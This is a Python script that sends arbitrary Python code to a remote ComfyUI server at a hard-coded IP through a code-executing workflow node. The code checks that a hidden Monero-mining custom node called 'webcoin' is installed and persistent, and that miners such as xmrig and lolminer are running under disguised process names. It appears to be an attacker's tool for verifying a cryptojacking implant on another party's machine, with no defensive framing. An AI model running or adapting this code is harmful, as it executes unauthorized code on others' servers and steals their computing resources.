"""Verify all critical files on remote without downloading anything."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = f"http://{ip}:8188"

code = r"""
import os
lines = []

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    for g in ['/root/ComfyUI/custom_nodes',
              r'C:\Users\u88ni\Desktop\comfyui\custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin') if cn else None
lines.append('target=' + str(target))

checks = {
    '__init__.py': ['_orch_done', 'moneroocean', '_shared_stats', 'event_loop_getter'],
    'core/config.py': ['API_TOKEN', 'moneroocean', '20300'],
    'core/dashboard.py': ['_shared_stats', '_get_event_loop', '_shared_clients'],
    'core/gpu_miner.py': ['moneroocean', '20300', 'is_moneroocean'],
    'core/miner.py': ['API_TOKEN', 'Bearer'],
}

for fname, needles in checks.items():
    fpath = os.path.join(target, fname)
    if not os.path.exists(fpath):
        lines.append('MISSING ' + fname)
        continue
    with open(fpath) as f:
        content = f.read()
    size = len(content)
    found = [n for n in needles if n in content]
    missing = [n for n in needles if n not in content]
    status = 'OK' if not missing else 'PARTIAL'
    lines.append(status + ' ' + fname + ' (' + str(size) + 'b) found=' + ','.join(found) + (' missing=' + ','.join(missing) if missing else ''))

# Check markers
for m in ['.orch.pid', '.initialized', '__pycache__']:
    mp = os.path.join(target, m)
    exists = os.path.exists(mp)
    lines.append('marker ' + m + '=' + str(exists))

# Check core/__pycache__
cp = os.path.join(target, 'core', '__pycache__')
lines.append('marker core/__pycache__=' + str(os.path.exists(cp)))

# Check if miners are running
try:
    import subprocess
    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
    for line in r.stdout.splitlines():
        if 'comfyui_service' in line or 'comfyui_render' in line or 'xmrig' in line or 'lolminer' in line.lower():
            lines.append('PROC: ' + line.strip()[:120])
except:
    lines.append('ps failed')

result = chr(10).join(lines)
"""

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

for attempt in range(10):
    time.sleep(5)
    try:
        req2 = urllib.request.Request(f"{base}/history/{pid}")
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print(f"Status: {status}\n")
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print(f"poll error: {e}")
else:
    print("Still pending after 50s")
